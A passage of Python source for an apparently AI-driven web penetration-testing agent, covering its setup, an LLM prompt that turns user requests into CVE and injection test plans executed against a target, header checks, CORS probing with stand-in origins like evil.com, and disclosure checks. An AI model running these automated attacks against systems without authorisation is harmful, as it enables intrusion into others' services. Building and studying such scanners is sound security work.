        "parameter_pollution": "parameter_pollution",
        "type_juggling": "type_juggling",
        "insecure_deserialization": "insecure_deserialization",
        "subdomain_takeover": "subdomain_takeover",
        "host_header_injection": "host_header_injection",
        "timing_attack": "timing_attack",
        "improper_error_handling": "improper_error_handling",
        "sensitive_data_exposure": "sensitive_data_exposure",
        "information_disclosure": "information_disclosure",
        "api_key_exposure": "api_key_exposure",
        "source_code_disclosure": "source_code_disclosure",
        "backup_file_exposure": "backup_file_exposure",
        "version_disclosure": "version_disclosure",
        # Crypto & Supply (8)
        "weak_encryption": "weak_encryption", "weak_hashing": "weak_hashing",
        "weak_random": "weak_random", "cleartext_transmission": "cleartext_transmission",
        "vulnerable_dependency": "vulnerable_dependency",
        "outdated_component": "outdated_component",
        "insecure_cdn": "insecure_cdn", "container_escape": "container_escape",
        # Cloud & API (9)
        "s3_bucket_misconfiguration": "s3_bucket_misconfiguration",
        "cloud_metadata_exposure": "cloud_metadata_exposure",
        "serverless_misconfiguration": "serverless_misconfiguration",
        "graphql_introspection": "graphql_introspection",
        "graphql_dos": "graphql_dos", "rest_api_versioning": "rest_api_versioning",
        "soap_injection": "soap_injection", "api_rate_limiting": "api_rate_limiting",
        "excessive_data_exposure": "excessive_data_exposure",
    }

    def __init__(
        self,
        target: str,
        mode: OperationMode = OperationMode.FULL_AUTO,
        log_callback: Optional[Callable] = None,
        progress_callback: Optional[Callable] = None,
        auth_headers: Optional[Dict] = None,
        task: Optional[Any] = None,
        custom_prompt: Optional[str] = None,
        recon_context: Optional[Dict] = None,
        finding_callback: Optional[Callable] = None,
        lab_context: Optional[Dict] = None,
        scan_id: Optional[str] = None,
        enable_kali_sandbox: bool = False,
        loaded_custom_prompts: Optional[List[Dict]] = None,
        preferred_provider: Optional[str] = None,
        preferred_model: Optional[str] = None,
        methodology_file: Optional[str] = None,
        enable_cli_agent: bool = False,
        cli_agent_provider: Optional[str] = None,
        selected_md_agents: Optional[List[str]] = None,
    ):
        self.target = self._normalize_target(target)
        self.mode = mode
        self.log = log_callback or self._default_log
        self.progress_callback = progress_callback
        self.finding_callback = finding_callback
        self.auth_headers = auth_headers or {}
        self.task = task
        self.custom_prompt = custom_prompt
        self.recon_context = recon_context
        self.lab_context = lab_context or {}
        self.scan_id = scan_id
        self.enable_kali_sandbox = enable_kali_sandbox
        self.loaded_custom_prompts: List[Dict] = loaded_custom_prompts or []
        self.preferred_provider = preferred_provider
        self.preferred_model = preferred_model
        self.enable_cli_agent = enable_cli_agent
        self.cli_agent_provider = cli_agent_provider
        self.selected_md_agents: Optional[List[str]] = selected_md_agents
        self._cancelled = False
        self._paused = False
        self._skip_to_phase: Optional[str] = None  # Phase skip target

        self.session: Optional[aiohttp.ClientSession] = None
        self.llm = LLMClient(
            preferred_provider=preferred_provider,
            preferred_model=preferred_model,
        )

        # VulnEngine integration (100 types, 428 payloads, 100 testers)
        self.vuln_registry = VulnerabilityRegistry()
        self.payload_generator = PayloadGenerator()
        self.response_verifier = ResponseVerifier()
        self.knowledge_base = self._load_knowledge_base()

        # PoC generator for confirmed findings
        from backend.core.poc_generator import PoCGenerator
        self.poc_generator = PoCGenerator()

        # Validation pipeline: negative controls + proof of execution + confidence scoring
        self.negative_controls = NegativeControlEngine()
        self.proof_engine = ProofOfExecution()
        self.confidence_scorer = ConfidenceScorer()
        self.validation_judge = ValidationJudge(
            self.negative_controls, self.proof_engine,
            self.confidence_scorer, self.llm,
            access_control_learner=getattr(self, 'access_control_learner', None)
        )

        # Execution history for cross-scan learning
        try:
            from backend.core.execution_history import ExecutionHistory
            self.execution_history = ExecutionHistory()
        except Exception:
            self.execution_history = None

        # Access control learning engine (adapts from BOLA/BFLA/IDOR outcomes)
        try:
            self.access_control_learner = AccessControlLearner()
        except Exception:
            self.access_control_learner = None

        # Adaptive learner (cross-scan TP/FP feedback learning)
        self.adaptive_learner = None
        if HAS_ADAPTIVE_LEARNER:
            try:
                self.adaptive_learner = AdaptiveLearner()
            except Exception:
                pass

        # RAG Engine: semantic retrieval + few-shot examples + reasoning memory
        self.rag_engine = None
        self.few_shot_selector = None
        self.reasoning_memory = None
        if HAS_RAG and os.getenv("ENABLE_RAG", "true").lower() != "false":
            try:
                rag_backend = os.getenv("RAG_BACKEND", "auto")
                self.rag_engine = RAGEngine(data_dir="data", backend=rag_backend)
                self.few_shot_selector = FewShotSelector(rag_engine=self.rag_engine)
                self.reasoning_memory = ReasoningMemory()
            except Exception as e:
                logger.warning(f"RAG init failed: {e}")

        # External methodology loader (injects into all LLM calls)
        self.methodology_index = None
        _meth_file = methodology_file or os.getenv("METHODOLOGY_FILE")
        if _meth_file and os.path.exists(_meth_file):
            try:
                from backend.core.methodology_loader import MethodologyLoader
                _loader = MethodologyLoader()
                self.methodology_index = _loader.load_from_file(_meth_file)
                if self.loaded_custom_prompts:
                    db_idx = _loader.load_from_db_prompts(self.loaded_custom_prompts)
                    self.methodology_index = _loader.merge_indices(
                        self.methodology_index, db_idx)
            except Exception as e:
                logger.warning(f"Methodology loader init failed: {e}")
        elif self.loaded_custom_prompts:
            try:
                from backend.core.methodology_loader import MethodologyLoader
                _loader = MethodologyLoader()
                self.methodology_index = _loader.load_from_db_prompts(
                    self.loaded_custom_prompts)
            except Exception:
                pass

        # Pass methodology index to validation judge
        if self.methodology_index:
            self.validation_judge.methodology_index = self.methodology_index

        # Autonomy modules (lazy-init after session in __aenter__)
        self.request_engine = None
        self.waf_detector = None
        self.strategy = None
        self.chain_engine = ChainEngine(llm=self.llm)
        self.auth_manager = None
        self._waf_result = None

        # Phase 1: Token budget + Reasoning engine
        self.token_budget = None
        if HAS_TOKEN_BUDGET and os.getenv("TOKEN_BUDGET"):
            self.token_budget = TokenBudget(
                total_budget=int(os.getenv("TOKEN_BUDGET", "100000"))
            )

        self.reasoning_engine = None
        if HAS_REASONING and os.getenv("ENABLE_REASONING", "true").lower() == "true":
            self.reasoning_engine = ReasoningEngine(self.llm, self.token_budget)

        self.task_manager = None
        if HAS_AGENT_TASKS:
            self.task_manager = AgentTaskManager()

        # Phase 2: Endpoint classifier, CVE hunter, Deep recon, Banner analyzer
        self.endpoint_classifier = EndpointClassifier() if HAS_ENDPOINT_CLASSIFIER else None
        self.cve_hunter = None  # Lazy-init after session
        self.deep_recon = None  # Lazy-init after session
        self.banner_analyzer = BannerAnalyzer() if HAS_BANNER_ANALYZER else None

        # Phase 3: Payload mutator, Param analyzer, XSS validator
        self.payload_mutator = PayloadMutator() if HAS_PAYLOAD_MUTATOR else None
        self.param_analyzer = ParameterAnalyzer() if HAS_PARAM_ANALYZER else None
        self.xss_validator = XSSValidator() if HAS_XSS_VALIDATOR else None

        # Phase 3.5: Request repeater, Site analyzer
        self.request_repeater = RequestRepeater() if HAS_REQUEST_REPEATER else None
        self.site_analyzer = SiteAnalyzer() if HAS_SITE_ANALYZER else None

        # Phase 4: Exploit generator, PoC validator
        self.exploit_generator = ExploitGenerator() if HAS_EXPLOIT_GENERATOR else None
        self.poc_validator_engine = None  # Lazy-init after session

        # Phase 5: Multi-agent orchestrator (optional replacement for 3-stream)
        self._orchestrator = None  # Lazy-init after session

        # Phase 5.5: MD-based agent orchestrator (post-recon dispatch)
        self._md_orchestrator = None  # Lazy-init after session

        # Researcher AI (0-day discovery with Kali sandbox, opt-in)
        self._researcher = None  # Lazy-init after session

        # Phase 6: Per-vuln-type agent orchestrator (opt-in via ENABLE_VULN_AGENTS)
        self._vuln_orchestrator = None

        # Phase 7: Checkpoint persistence
        self._checkpoint_manager = (
            CheckpointManager(self.scan_id) if HAS_CHECKPOINT and self.scan_id else None
        )
        self._last_progress = 0
        self._last_phase = ""

        # Data storage
        self.recon = ReconData()
        self.memory = AgentMemory()
        self._site_architecture = None  # SiteAnalyzer architecture analysis result
        self.custom_prompts: List[str] = []
        self.tool_executions: List[Dict] = []
        self.rejected_findings: List[Finding] = []
        self._sandbox = None  # Lazy-init sandbox reference for tool runner
        self.container_status: Optional[Dict] = None  # Container telemetry

    @property
    def findings(self) -> List[Finding]:
        """Backward-compatible access to confirmed findings via memory"""
        return self.memory.confirmed_findings

    def cancel(self):
        """Cancel the agent execution"""
        self._cancelled = True
        self._paused = False  # Unpause so cancel is immediate
        if self._vuln_orchestrator:
            self._vuln_orchestrator.cancel()

    def is_cancelled(self) -> bool:
        """Check if agent was cancelled"""
        return self._cancelled

    def pause(self):
        """Pause the agent execution"""
        self._paused = True

    def resume(self):
        """Resume the agent execution"""
        self._paused = False

    def is_paused(self) -> bool:
        """Check if agent is paused"""
        return self._paused

    async def _wait_if_paused(self):
        """Block while paused, checking for cancel every second"""
        while self._paused and not self._cancelled:
            await asyncio.sleep(1)

    def _save_checkpoint(self):
        """Save current state for crash-resilient resume."""
        if not self._checkpoint_manager:
            return
        try:
            state = {
                "target": self.target,
                "mode": self.mode,
                "scan_type": self.scan_type,
                "progress": self._last_progress,
                "phase": self._last_phase,
                "recon_data": {
                    "endpoints": [
                        {"url": e.url, "method": e.method, "params": e.params}
                        for e in self.recon.endpoints[:50]
                    ],
                    "technologies": list(self.recon.technologies),
                    "forms": self.recon.forms[:20] if hasattr(self.recon, 'forms') else [],
                },
                "findings": [
                    {
                        "title": f.title,
                        "vuln_type": f.vulnerability_type,
                        "severity": f.severity,
                        "endpoint": f.endpoint,
                        "confidence_score": getattr(f, 'confidence_score', 0),
                    }
                    for f in self.findings
                ],
                "rejected_count": len(self.rejected_findings),
                "junior_tested_types": list(getattr(self, '_junior_tested_types', set())),
            }
            self._checkpoint_manager.save(state)
        except Exception:
            pass  # Never block scan flow

    async def _vuln_agent_ws_broadcast(self, message: Dict):
        """Broadcast vuln agent status updates via WebSocket."""
        if self.scan_id:
            try:
                from backend.api.websocket import manager as ws_manager
                await ws_manager.send_to_scan(self.scan_id, message)
            except Exception:
                pass

    def _build_test_targets(self) -> List[Dict]:
        """Build test target list from recon data (shared by sequential and orchestrated paths)."""
        test_targets = []

        # Endpoints with parameters
        for endpoint in self.recon.endpoints[:20]:
            url = _get_endpoint_url(endpoint)
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            if parsed.query:
                params = list(parse_qs(parsed.query).keys())
                test_targets.append({
                    "url": base_url, "method": "GET",
                    "params": params, "original_url": url,
                })
            elif url in self.recon.parameters:
                test_targets.append({
                    "url": url, "method": "GET",
                    "params": self.recon.parameters[url],
                })

        # Forms
        for form in self.recon.forms[:10]:
            form_defaults = {}
            for detail in form.get('input_details', []):
                name = detail.get('name', '')
                if name and detail.get('value'):
                    form_defaults[name] = detail['value']
            test_targets.append({
                "url": form['action'], "method": form['method'],
                "params": form.get('inputs', []),
                "form_defaults": form_defaults,
            })

        # Fallback: common params
        if not test_targets:
            for endpoint in self.recon.endpoints[:5]:
                test_targets.append({
                    "url": _get_endpoint_url(endpoint), "method": "GET",
                    "params": ["id", "q", "search", "page", "file", "url", "cat", "artist", "item"],
                })

        # Always include main target
        test_targets.append({
            "url": self.target, "method": "GET",
            "params": ["id", "q", "search", "page", "file", "url", "path", "redirect", "cat", "item"],
        })

        return test_targets

    # Phase ordering for skip-to-phase support
    AGENT_PHASES = ["recon", "analysis", "testing", "enhancement", "completed"]

    def skip_to_phase(self, target_phase: str) -> bool:
        """Signal the agent to skip to a given phase"""
        if target_phase not in self.AGENT_PHASES:
            return False
        self._skip_to_phase = target_phase
        return True

    def _check_skip(self, current_phase: str) -> Optional[str]:
        """Check if we should skip to a phase ahead of current_phase"""
        target = self._skip_to_phase
        if not target:
            return None
        try:
            cur_idx = self.AGENT_PHASES.index(current_phase)
            tgt_idx = self.AGENT_PHASES.index(target)
        except ValueError:
            return None
        if tgt_idx > cur_idx:
            self._skip_to_phase = None
            return target
        self._skip_to_phase = None
        return None

    def _map_vuln_type(self, vuln_type: str) -> str:
        """Map agent vuln type name to VulnEngine registry key"""
        return self.VULN_TYPE_MAP.get(vuln_type, vuln_type)

    def _get_payloads(self, vuln_type: str) -> List[str]:
        """Get payloads from VulnEngine PayloadGenerator"""
        mapped = self._map_vuln_type(vuln_type)
        payloads = self.payload_generator.payload_libraries.get(mapped, [])
        if not payloads:
            # Try original name
            payloads = self.payload_generator.payload_libraries.get(vuln_type, [])
        return payloads

    @staticmethod
    def _load_knowledge_base() -> Dict:
        """Load vulnerability knowledge base JSON at startup"""
        kb_path = Path(__file__).parent.parent.parent / "data" / "vuln_knowledge_base.json"
        try:
            with open(kb_path, "r") as f:
                return json.load(f)
        except Exception:
            return {}

    async def add_custom_prompt(self, prompt: str):
        """Add a custom prompt to be processed"""
        self.custom_prompts.append(prompt)
        await self.log_llm("info", f"[USER PROMPT RECEIVED] {prompt}")
        # Process immediately if LLM is available
        if self.llm.is_available():
            await self._process_custom_prompt(prompt)

    async def _process_custom_prompt(self, prompt: str):
        """Process a custom user prompt with the LLM and execute requested tests.

        Detects CVE references and vulnerability test requests, then ACTUALLY tests
        them against the target instead of just providing AI text responses.
        """
        await self.log_llm("info", f"[AI] Processing user prompt: {prompt}")

        # Detect CVE references in prompt
        cve_match = re.search(r'CVE-\d{4}-\d{4,}', prompt, re.IGNORECASE)
        cve_id = cve_match.group(0).upper() if cve_match else None

        # Build context about available endpoints
        endpoints_info = []
        for ep in self.recon.endpoints[:20]:
            endpoints_info.append(f"- {_get_endpoint_method(ep)} {_get_endpoint_url(ep)}")

        params_info = []
        for param, values in list(self.recon.parameters.items())[:15]:
            params_info.append(f"- {param}: {values[:3]}")

        forms_info = []
        for form in self.recon.forms[:10]:
            forms_info.append(f"- {form.get('method', 'GET')} {form.get('action', 'N/A')} fields={form.get('inputs', [])[:5]}")

        # Enhanced system prompt that requests actionable test plans
        system_prompt = f"""You are a senior penetration tester performing ACTIVE TESTING against {self.target}.
The user wants you to ACTUALLY TEST for vulnerabilities, not just explain them.
{'The user is asking about ' + cve_id + '. Research this CVE and generate specific test payloads.' if cve_id else ''}

Current reconnaissance data:
Target: {self.target}
Endpoints ({len(self.recon.endpoints)} total):
{chr(10).join(endpoints_info[:10]) if endpoints_info else '  None discovered yet'}

Parameters ({len(self.recon.parameters)} total):
{chr(10).join(params_info[:10]) if params_info else '  None discovered yet'}

Forms ({len(self.recon.forms)} total):
{chr(10).join(forms_info[:5]) if forms_info else '  None discovered yet'}

Technologies detected: {', '.join(self.recon.technologies) if self.recon.technologies else 'None'}

CRITICAL: You must respond with a TEST PLAN in JSON format. The agent will EXECUTE these tests.
Available injection points: "parameter", "header", "cookie", "body", "path"
Available vuln types: xss_reflected, xss_stored, sqli_error, sqli_union, sqli_blind, sqli_time,
  command_injection, ssti, lfi, rfi, path_traversal, ssrf, xxe, crlf_injection, header_injection,
  host_header_injection, open_redirect, csrf, nosql_injection, idor, cors_misconfig

Respond in this JSON format:
{{
  "analysis": "What the user is asking and your security assessment",
  "action": "test_cve|test_endpoint|test_parameter|scan_for|analyze|info",
  "vuln_type": "primary vulnerability type to test",
  "injection_point": "parameter|header|cookie|body|path",
  "header_name": "X-Forwarded-For",
  "payloads": ["payload1", "payload2", "payload3"],
  "targets": ["specific URLs to test"],
  "vuln_types": ["list of vuln types if scanning for multiple"],
  "response": "Brief explanation shown to the user"
}}

For CVE testing, include at least 5 specific payloads based on the CVE's attack vector.
Always set action to "test_cve" or "test_endpoint" when the user asks to test something."""

        # Append anti-hallucination directives
        system_prompt += "\n\n" + self._get_enhanced_system_prompt("testing")

        try:
            response = await self.llm.generate(prompt, system=system_prompt)
            if not response:
                await self.log_llm("warning", "[AI] No response from LLM")
                return

            await self.log_llm("info", f"[AI] Analyzing request and building test plan...")

            import json
            try:
                json_match = re.search(r'\{[\s\S]*\}', response)
                if json_match:
                    action_data = json.loads(json_match.group())
                    action = action_data.get("action", "info")
                    targets = action_data.get("targets", [])
                    vuln_types = action_data.get("vuln_types", [])
                    vuln_type = action_data.get("vuln_type", "")
                    injection_point = action_data.get("injection_point", "parameter")
                    header_name = action_data.get("header_name", "")
                    payloads = action_data.get("payloads", [])
                    ai_response = action_data.get("response", response)

                    await self.log_llm("info", f"[AI] {ai_response[:300]}")

                    # ── CVE Testing: Actually execute tests ──
                    if action == "test_cve":
                        await self.log_llm("info", f"[AI] Executing CVE test plan: {vuln_type} via {injection_point}")
                        await self._execute_cve_test(
                            cve_id or "CVE-unknown",
                            vuln_type, injection_point, header_name,
                            payloads, targets
                        )

                    elif action == "test_endpoint" and targets:
                        await self.log_llm("info", f"[AI] Testing {len(targets)} endpoints...")
                        for target_url in targets[:5]:
                            if payloads and vuln_type:
                                # Use AI-generated payloads with correct injection
                                await self._execute_targeted_test(
                                    target_url, vuln_type, injection_point,
                                    header_name, payloads
                                )
                            else:
                                await self._test_custom_endpoint(target_url, vuln_types or ["xss_reflected", "sqli_error"])

                    elif action == "test_parameter" and targets:
                        await self.log_llm("info", f"[AI] Testing parameters: {targets}")
                        await self._test_custom_parameters(targets, vuln_types or ["xss_reflected", "sqli_error"])

                    elif action == "scan_for" and vuln_types:
                        await self.log_llm("info", f"[AI] Scanning for: {vuln_types}")
                        for vtype in vuln_types[:5]:
                            await self._scan_for_vuln_type(vtype)

                    elif action == "analyze":
                        await self.log_llm("info", f"[AI] Analysis complete")

                    else:
                        await self.log_llm("info", f"[AI] Response provided - no active test needed")
                else:
                    await self.log_llm("info", f"[AI RESPONSE] {response[:1000]}")

            except json.JSONDecodeError:
                await self.log_llm("info", f"[AI RESPONSE] {response[:1000]}")

        except Exception as e:
            await self.log_llm("error", f"[AI] Error processing prompt: {str(e)}")

    async def _test_custom_endpoint(self, url: str, vuln_types: List[str]):
        """Test a specific endpoint for vulnerabilities"""
        if not self.session:
            return

        await self.log("info", f"  Testing endpoint: {url}")

        try:
            # Parse URL to find parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            if not params:
                # Try adding common parameters
                params = {"id": ["1"], "q": ["test"]}

            for param_name in list(params.keys())[:3]:
                for vtype in vuln_types[:2]:
                    payloads = self._get_payloads(vtype)[:2]
                    for payload in payloads:
                        await self._test_single_param(url, param_name, payload, vtype)

        except Exception as e:
            await self.log("debug", f"  Error testing {url}: {e}")

    async def _test_custom_parameters(self, param_names: List[str], vuln_types: List[str]):
        """Test specific parameters across known endpoints"""
        endpoints_with_params = [
            ep for ep in self.recon.endpoints
            if any(p in str(ep) for p in param_names)
        ]

        if not endpoints_with_params:
            # Use all endpoints that have parameters
            endpoints_with_params = self.recon.endpoints[:10]

        for ep in endpoints_with_params[:5]:
            url = _get_endpoint_url(ep)
            for param in param_names[:3]:
                for vtype in vuln_types[:2]:
                    payloads = self._get_payloads(vtype)[:2]
                    for payload in payloads:
                        await self._test_single_param(url, param, payload, vtype)

    async def _execute_cve_test(self, cve_id: str, vuln_type: str,
                                injection_point: str, header_name: str,
                                payloads: List[str], targets: List[str]):
        """Execute actual CVE testing with AI-generated payloads against the target."""
        await self.log("warning", f"  [CVE TEST] Testing {cve_id} ({vuln_type}) via {injection_point}")

        # Build test targets: use AI-suggested URLs or fall back to discovered endpoints
        test_urls = targets[:5] if targets else []
        if not test_urls:
            test_urls = [self.target]
            for ep in self.recon.endpoints[:10]:
                ep_url = _get_endpoint_url(ep)
                if ep_url and ep_url not in test_urls:
                    test_urls.append(ep_url)

        # Also use payloads from the PayloadGenerator as fallback
        all_payloads = list(payloads[:10])
        registry_payloads = self._get_payloads(vuln_type)[:5]
        for rp in registry_payloads:
            if rp not in all_payloads:
                all_payloads.append(rp)

        findings_count = 0
        for test_url in test_urls[:5]:
            if self.is_cancelled():
                return
            await self.log("info", f"  [CVE TEST] Testing {test_url[:60]}...")

            for payload in all_payloads[:10]:
                if self.is_cancelled():
                    return

                # Use correct injection method
                if injection_point == "header":
                    test_resp = await self._make_request_with_injection(
                        test_url, "GET", payload,
                        injection_point="header",
                        header_name=header_name or "X-Forwarded-For"
                    )
                    param_name = header_name or "X-Forwarded-For"
                elif injection_point in ("body", "cookie", "path"):
                    parsed = urlparse(test_url)
                    params = list(parse_qs(parsed.query).keys()) if parsed.query else ["data"]
                    test_resp = await self._make_request_with_injection(
                        test_url, "POST" if injection_point == "body" else "GET",
                        payload, injection_point=injection_point,
                        param_name=params[0] if params else "data"
                    )
                    param_name = params[0] if params else "data"
                else:  # parameter
                    parsed = urlparse(test_url)
                    params = list(parse_qs(parsed.query).keys()) if parsed.query else ["id", "q"]
                    param_name = params[0] if params else "id"
                    test_resp = await self._make_request_with_injection(
                        test_url, "GET", payload,
                        injection_point="parameter",
                        param_name=param_name
                    )

                if not test_resp:
                    continue

                # Verify the response
                is_vuln, evidence = await self._verify_vulnerability(
                    vuln_type, payload, test_resp, None
                )

                if is_vuln:
                    evidence = f"[{cve_id}] {evidence}"
                    finding = self._create_finding(
                        vuln_type, test_url, param_name, payload,
                        evidence, test_resp, ai_confirmed=True
                    )
                    finding.title = f"{cve_id} - {finding.title}"
                    finding.references.append(f"https://nvd.nist.gov/vuln/detail/{cve_id}")
                    await self._add_finding(finding)
                    findings_count += 1
                    await self.log("warning", f"  [CVE TEST] {cve_id} CONFIRMED at {test_url[:50]}")
                    break  # One finding per URL is enough

        if findings_count == 0:
            await self.log("info", f"  [CVE TEST] {cve_id} not confirmed after testing {len(test_urls)} targets with {len(all_payloads)} payloads")
        else:
            await self.log("warning", f"  [CVE TEST] {cve_id} found {findings_count} vulnerable endpoint(s)")

    async def _execute_targeted_test(self, url: str, vuln_type: str,
                                      injection_point: str, header_name: str,
                                      payloads: List[str]):
        """Execute targeted vulnerability tests with specific payloads and injection point."""
        await self.log("info", f"  [TARGETED] Testing {vuln_type} via {injection_point} at {url[:60]}")

        for payload in payloads[:10]:
            if self.is_cancelled():
                return

            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys()) if parsed.query else ["id"]
            param_name = params[0] if params else "id"

            if injection_point == "header":
                param_name = header_name or "X-Forwarded-For"

            test_resp = await self._make_request_with_injection(
                url, "GET", payload,
                injection_point=injection_point,
                param_name=param_name,
                header_name=header_name
            )

            if not test_resp:
                continue

            is_vuln, evidence = await self._verify_vulnerability(
                vuln_type, payload, test_resp, None
            )

            if is_vuln:
                finding = self._create_finding(
                    vuln_type, url, param_name, payload,
                    evidence, test_resp, ai_confirmed=True
                )
                await self._add_finding(finding)
                await self.log("warning", f"  [TARGETED] {vuln_type} confirmed at {url[:50]}")
                return

        await self.log("info", f"  [TARGETED] {vuln_type} not confirmed at {url[:50]}")

    async def _scan_for_vuln_type(self, vuln_type: str):
        """Scan all endpoints for a specific vulnerability type"""
        await self.log("info", f"  Scanning for {vuln_type.upper()} vulnerabilities...")

        vuln_lower = vuln_type.lower()

        # Handle header-based vulnerabilities (no payloads needed)
        if vuln_lower in ["clickjacking", "x-frame-options", "csp", "hsts", "headers", "security headers", "missing headers"]:
            await self._test_security_headers(vuln_lower)
            return

        # Handle CORS testing
        if vuln_lower in ["cors", "cross-origin"]:
            await self._test_cors()
            return

        # Handle information disclosure
        if vuln_lower in ["info", "information disclosure", "version", "technology"]:
            await self._test_information_disclosure()
            return

        # Standard payload-based testing
        payloads = self._get_payloads(vuln_type)[:3]
        if not payloads:
            # Try AI-based testing for unknown vuln types
            await self._ai_test_vulnerability(vuln_type)
            return

        for ep in self.recon.endpoints[:10]:
            url = _get_endpoint_url(ep)
            for param in list(self.recon.parameters.keys())[:5]:
                for payload in payloads:
                    await self._test_single_param(url, param, payload, vuln_type)

    async def _test_security_headers(self, vuln_type: str):
        """Test for security header vulnerabilities like clickjacking"""
        await self.log("info", f"  Testing security headers...")

        # Test main target and key pages
        test_urls = [self.target]
        for ep in self.recon.endpoints[:5]:
            url = _get_endpoint_url(ep) if isinstance(ep, dict) else ep
            if url and url not in test_urls:
                test_urls.append(url)

        for url in test_urls:
            if self.is_cancelled():
                return
            try:
                async with self.session.get(url, allow_redirects=True, timeout=self._get_request_timeout()) as resp:
                    headers = dict(resp.headers)
                    headers_lower = {k.lower(): v for k, v in headers.items()}

                    findings = []

                    # Check X-Frame-Options (Clickjacking)
                    x_frame = headers_lower.get("x-frame-options", "")
                    csp = headers_lower.get("content-security-policy", "")

                    if not x_frame and "frame-ancestors" not in csp.lower():
                        findings.append({
                            "type": "clickjacking",
                            "title": "Missing Clickjacking Protection",
                            "severity": "medium",
                            "description": "The page lacks X-Frame-Options header and CSP frame-ancestors directive, making it vulnerable to clickjacking attacks.",
                            "evidence": f"X-Frame-Options: Not set\nCSP: {csp[:100] if csp else 'Not set'}",
                            "remediation": "Add 'X-Frame-Options: DENY' or 'X-Frame-Options: SAMEORIGIN' header, or use 'frame-ancestors' in CSP."
                        })

                    # Check HSTS
                    hsts = headers_lower.get("strict-transport-security", "")
                    if not hsts and url.startswith("https"):
                        findings.append({
                            "type": "missing_hsts",
                            "title": "Missing HSTS Header",
                            "severity": "low",
                            "description": "HTTPS site without Strict-Transport-Security header, vulnerable to protocol downgrade attacks.",
                            "evidence": "Strict-Transport-Security: Not set",
                            "remediation": "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' header."
                        })

                    # Check X-Content-Type-Options
                    if "x-content-type-options" not in headers_lower:
                        findings.append({
                            "type": "missing_xcto",
                            "title": "Missing X-Content-Type-Options Header",
                            "severity": "low",
                            "description": "Missing nosniff header allows MIME-sniffing attacks.",
                            "evidence": "X-Content-Type-Options: Not set",
                            "remediation": "Add 'X-Content-Type-Options: nosniff' header."
                        })

                    # Check CSP
                    if not csp:
                        findings.append({
                            "type": "missing_csp",
                            "title": "Missing Content-Security-Policy Header",
                            "severity": "low",
                            "description": "No Content-Security-Policy header, increasing XSS risk.",
                            "evidence": "Content-Security-Policy: Not set",
                            "remediation": "Implement a restrictive Content-Security-Policy."
                        })

                    # Create findings (non-AI: detected by header inspection)
                    # Domain-scoped dedup: only 1 finding per domain for header issues
                    for f in findings:
                        mapped = self._map_vuln_type(f["type"])
                        vt = f["type"]

                        # Check if we already have this finding for this domain
                        if self.memory.has_finding_for(vt, url):
                            # Append URL to existing finding's affected_urls
                            for ef in self.memory.confirmed_findings:
                                if ef.vulnerability_type == vt:
                                    if url not in ef.affected_urls:
                                        ef.affected_urls.append(url)
                                    break
                            continue

                        finding = Finding(
                            id=hashlib.md5(f"{vt}{url}".encode()).hexdigest()[:8],
                            title=self.vuln_registry.get_title(mapped) or f["title"],
                            severity=self.vuln_registry.get_severity(mapped) or f["severity"],
                            vulnerability_type=vt,
                            cvss_score=self._get_cvss_score(vt),
                            cvss_vector=self._get_cvss_vector(vt),
                            cwe_id=self.vuln_registry.get_cwe_id(mapped) or "CWE-693",
                            description=self.vuln_registry.get_description(mapped) or f["description"],
                            affected_endpoint=url,
                            evidence=f["evidence"],
                            remediation=self.vuln_registry.get_remediation(mapped) or f["remediation"],
                            affected_urls=[url],
                            ai_verified=False  # Detected by inspection, not AI
                        )
                        await self._add_finding(finding)

            except Exception as e:
                await self.log("debug", f"  Header test error: {e}")

    async def _test_cors(self):
        """Test for CORS misconfigurations"""
        await self.log("info", f"  Testing CORS configuration...")

        test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null"
        ]

        for url in [self.target] + [_get_endpoint_url(ep) for ep in self.recon.endpoints[:3]]:
            if not url:
                continue

            for origin in test_origins:
                try:
                    headers = {"Origin": origin}
                    async with self.session.get(url, headers=headers) as resp:
                        acao = resp.headers.get("Access-Control-Allow-Origin", "")
                        acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                        if acao == origin or acao == "*":
                            # Domain-scoped dedup for CORS
                            if self.memory.has_finding_for("cors_misconfig", url):
                                for ef in self.memory.confirmed_findings:
                                    if ef.vulnerability_type == "cors_misconfig":
                                        if url not in ef.affected_urls:
                                            ef.affected_urls.append(url)
                                        break
                                break

                            severity = "high" if acac.lower() == "true" else "medium"
                            finding = Finding(
                                id=hashlib.md5(f"cors{url}{origin}".encode()).hexdigest()[:8],
                                title=self.vuln_registry.get_title("cors_misconfig") or f"CORS Misconfiguration - {origin}",
                                severity=severity,
                                vulnerability_type="cors_misconfig",
                                cvss_score=self._get_cvss_score("cors_misconfig"),
                                cvss_vector=self._get_cvss_vector("cors_misconfig"),
                                cwe_id=self.vuln_registry.get_cwe_id("cors_misconfig") or "CWE-942",
                                description=self.vuln_registry.get_description("cors_misconfig") or f"The server reflects the Origin header '{origin}' in Access-Control-Allow-Origin.",
                                affected_endpoint=url,
                                evidence=f"Origin: {origin}\nAccess-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                                remediation=self.vuln_registry.get_remediation("cors_misconfig") or "Configure CORS to only allow trusted origins.",
                                affected_urls=[url],
                                ai_verified=False  # Detected by inspection, not AI
                            )
                            await self._add_finding(finding)
                            await self.log("warning", f"  [FOUND] CORS misconfiguration at {url[:50]}")
                            break
                except:
                    pass

    async def _test_information_disclosure(self):
        """Test for information disclosure"""
        await self.log("info", f"  Testing for information disclosure...")

        for url in [self.target] + [_get_endpoint_url(ep) for ep in self.recon.endpoints[:5]]:
            if not url:
                continue
            try:
                async with self.session.get(url) as resp:
                    headers = dict(resp.headers)

                    # Server header disclosure (domain-scoped: sensitive_data_exposure)
                    server = headers.get("Server", "")
                    if server and any(v in server.lower() for v in ["apache/", "nginx/", "iis/", "tomcat/"]):
                        vt = "sensitive_data_exposure"
                        dedup_key = f"server_version"
                        if self.memory.has_finding_for(vt, url, dedup_key):
                            for ef in self.memory.confirmed_findings:
                                if ef.vulnerability_type == vt and ef.parameter == dedup_key:
                                    if url not in ef.affected_urls:
                                        ef.affected_urls.append(url)
                                    break
                        else:
                            finding = Finding(
                                id=hashlib.md5(f"server{url}".encode()).hexdigest()[:8],
                                title="Server Version Disclosure",
                                severity="info",
                                vulnerability_type=vt,
                                cvss_score=0.0,
                                cwe_id="CWE-200",
                                description=f"The server discloses its version: {server}",
